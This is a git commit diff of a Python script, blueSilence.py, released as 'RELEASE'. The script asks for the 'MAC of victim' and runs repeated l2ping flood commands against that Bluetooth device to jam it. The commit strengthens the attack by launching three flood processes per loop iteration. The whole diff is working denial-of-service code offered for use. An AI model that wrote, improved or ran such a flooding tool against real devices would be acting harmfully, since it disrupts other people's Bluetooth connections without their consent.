34a749bff10dfbae417f2b0b8657449df40d59ea
void <fluffy.siberian.cat@gmail.com>
2023-04-28 11:06:52 +1000

    RELEASE

--- blueSilence.py
+++ blueSilence.py
@@ -8,7 +8,6 @@ import random
 colorama.init(autoreset=True)
 def start():
     headers.header()
-
 start()
 
 mac = input("MAC of victim: ")
@@ -17,7 +16,8 @@ print("Start jamming...")
 delay = int(time)
 
 while delay != 0:
-    xterm_1 = "timeout 1s l2ping -i hci0 -s 800 -f %s &" % (mac)
-    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
-    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+    for i in range(3):
+        xterm_1 = "timeout 1s l2ping -i hci0 -s 800 -f %s &" % (mac)
+        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+
     delay -= 1
